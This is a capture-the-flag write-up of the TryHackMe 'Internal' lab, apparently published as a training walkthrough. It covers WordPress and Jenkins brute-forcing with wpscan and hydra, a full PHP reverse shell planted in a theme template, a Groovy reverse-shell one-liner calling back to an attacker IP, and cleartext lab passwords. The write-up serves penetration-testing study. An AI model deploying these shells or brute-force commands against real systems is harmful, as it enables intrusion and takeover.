![image](https://user-images.githubusercontent.com/87468669/194774642-06db820e-69da-4493-a93a-d01368bf8485.png)

```
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Ensure that you modify your hosts file to reflect internal.thm
    Any tools or techniques are permitted in this engagement
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.


Note - this room can be completed without Metasploit
```

First we start with nmap scan.

```
# Nmap 7.92 scan initiated Sun Oct  9 12:52:29 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 10.10.202.145
Warning: 10.10.202.145 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.202.145
Host is up (0.24s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE         VERSION
22/tcp   open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp   open     http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1088/tcp filtered cplscrambler-al
1718/tcp filtered h323gatedisc
6129/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  9 12:53:09 2022 -- 1 IP address (1 host up) scanned in 39.85 seconds
```

We have http and ssh ports open, let's enumerate http.

![image](https://user-images.githubusercontent.com/87468669/194774860-3a41d45e-101b-4a52-8952-bd414b525082.png)

cool it's running apache web service, let burst hidden directories

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Internal]
└─$ ffuf -u "http://10.10.202.145/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.202.145/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

blog                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 198ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 185ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 210ms]
phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 208ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 181ms]
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 200ms]
:: Progress: [4713/4713] :: Job [1/1] :: 225 req/sec :: Duration: [0:01:34] :: Errors: 80 ::
```

let's check the dir path /blog 

![image](https://user-images.githubusercontent.com/87468669/194775031-053e2b43-039f-4d02-8c05-4c69d6188775.png)

The page path /blog seems to be running wordpress cms, let's enumerate with wpscan.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Internal]                                                                                                              
└─$ wpscan --url http://10.10.202.145/blog/ --enumerate u  
```

Enumerating for usernames on the wordpress blog and we got only one which is `admin` .

![image](https://user-images.githubusercontent.com/87468669/194775325-5b1976e7-8db0-4bcf-8854-656c180c3fde.png)

Let's try bruteforce the user password for the user admin

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Internal]
└─$ wpscan --url http://10.10.202.145/blog/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
```

Password found, we bruteforce a valid password for user `admin` password: `my2boys`

![image](https://user-images.githubusercontent.com/87468669/194792464-d5c2134b-f3d1-4d19-9484-304a8c178915.png)

Dont forget to add the hostname internal.thm to our /etc/hosts file

![image](https://user-images.githubusercontent.com/87468669/194792670-bb890017-0325-43ac-9520-cc8409685a13.png)

Now let's login wp-admin with the creds we found username: admin, password: my2boys

![image](https://user-images.githubusercontent.com/87468669/194792763-4e968d4a-8f85-41d2-a964-a01995abfae1.png)

We are in, let's upload our shell. first click on Apperence, then go to the theme editor, click on 404 templates

![image](https://user-images.githubusercontent.com/87468669/194793128-dc7719e9-0b66-4e84-8b0e-583e7e1d2c32.png)

Edit the contents of 404 templates, put the revserse shell payload and click on update file to save it 

![image](https://user-images.githubusercontent.com/87468669/194793293-b699c965-4db8-4997-8f01-b33b0fe99098.png)

Reverse Shell Payload 

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.12.222';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Netcat listener ready 

![image](https://user-images.githubusercontent.com/87468669/194793347-ef086d95-5726-4ec1-a5a7-7239ef6195e6.png)

Now let's locate our shell

it is in the path `internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

![image](https://user-images.githubusercontent.com/87468669/194793583-ff8dc869-839d-4142-916e-6c3b2cff1a9e.png)

Check Back on our ncat listener we got a revshell 

![image](https://user-images.githubusercontent.com/87468669/194793643-993885c5-a858-4e7c-bc92-95ed73012105.png)

Let's Stablize the shell 

![image](https://user-images.githubusercontent.com/87468669/194793885-8a7c2f40-727e-4f48-89b7-0f866007a354.png)

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo;fg
export TERM=xterm
```

we got a stable shell, now let's escalate privs to root. checking for suid `find / -perm -u=s -type f 2>/dev/null`

![image](https://user-images.githubusercontent.com/87468669/194794335-75c90753-99ff-4037-ba2b-20b46648c1fa.png)

we got nothing useful so let's play around checking every possible directory to see what we can escalate prives with.

![image](https://user-images.githubusercontent.com/87468669/194794604-cdfc2dfd-1e5b-4262-ab9a-db52a3fce0f5.png)

Got something intresting in the /opt directory, that seems to be an ssh creds so let's try out ssh with them .

![image](https://user-images.githubusercontent.com/87468669/194794817-76610fb3-8118-413f-9dbc-4416823f6b33.png)

Cool we got in ssh with those creds, let's find user.txt flag .

![image](https://user-images.githubusercontent.com/87468669/194795004-f73bd0be-2d66-4515-8236-4420bc4098b8.png)

and we also have jenkins.txt, let's check the content of jenkins.txt .

![image](https://user-images.githubusercontent.com/87468669/194795061-bbbf0bb6-32b7-4c0b-8d7c-10b0969f628e.png)

hmmmm... that could be a hint for us to root the box .

![image](https://user-images.githubusercontent.com/87468669/194795123-f3ee0f3d-9384-4d5f-902f-9bd947599db3.png)

tried `sudo -l` but user aubreanna may not run sudo on internal. Let's check for processes running using `netstat -ano` .

![image](https://user-images.githubusercontent.com/87468669/194795276-e79971c5-8902-4a71-b60a-d974067021ab.png)

we can see there's an http server on port 8080 running locally in the machine. Let's do port forwarding to our attacker machine for us to know what is running on that port.

![image](https://user-images.githubusercontent.com/87468669/194795581-dc640b52-0b02-42f2-8c85-3cb747bb9319.png)

```
ssh -L 8080:127.0.0.1:8080 aubreanna@internal.thm
```

Now let's check the process 127.0.0.1:8080 on our browser since we already port forwarded it to our attacker machine.

![image](https://user-images.githubusercontent.com/87468669/194795701-22c5a9e3-9f64-450d-b83c-e51cc91a1626.png)

great we can see it is running a jenkins http service, trying default and common creds did not work, let's bruteforce the login page using hydra 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

![image](https://user-images.githubusercontent.com/87468669/194796763-b368fc50-3085-4b4c-bcfd-4431155d0dbb.png)

we got the username and password, let's login

![image](https://user-images.githubusercontent.com/87468669/194796839-1fd65f8a-1647-443d-9433-db721bc67e3a.png)

We are in, let's upload a shell. Navigate to the /script directory

![image](https://user-images.githubusercontent.com/87468669/194797188-201106bc-f582-4b31-978c-f5790d4b6c06.png)

using a groovy script revshell payload 

```
String host="10.8.12.222";int port=1337;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Ncat listener ready 

![image](https://user-images.githubusercontent.com/87468669/194797308-d4b72da3-c04b-4e63-8f47-9e8118b8c16d.png)

paste the reverse shell payload and run it 

![image](https://user-images.githubusercontent.com/87468669/194797379-781cd57b-8985-4138-aa89-c002dc128b49.png)

Check back ncat listener and we got a shell

![image](https://user-images.githubusercontent.com/87468669/194797458-084e189f-647d-482f-a3f7-c01008828fe1.png)

Let's stabilize and escalate out privs to root 

![image](https://user-images.githubusercontent.com/87468669/194797547-0783a4cf-fdd3-41af-b783-b5f2fa6d59e7.png)

we got a stable shell, let's play around checking every possible directories for creds or hint 

![image](https://user-images.githubusercontent.com/87468669/194798160-fcd126a1-26be-46df-914b-1062e08662fe.png)

we got some creds for rootin /opt directory, let's ssh with those creds username:root and password:tr0ub13guM!@#123

![image](https://user-images.githubusercontent.com/87468669/194798298-565a8e2c-530d-47a0-b506-28165b49d4ed.png)

we are in as root let's find the root flag 

![image](https://user-images.githubusercontent.com/87468669/194798432-7b513703-8308-48da-bdf3-fe6792095d28.png)

There we have our root flag... Hope you had fun 😉

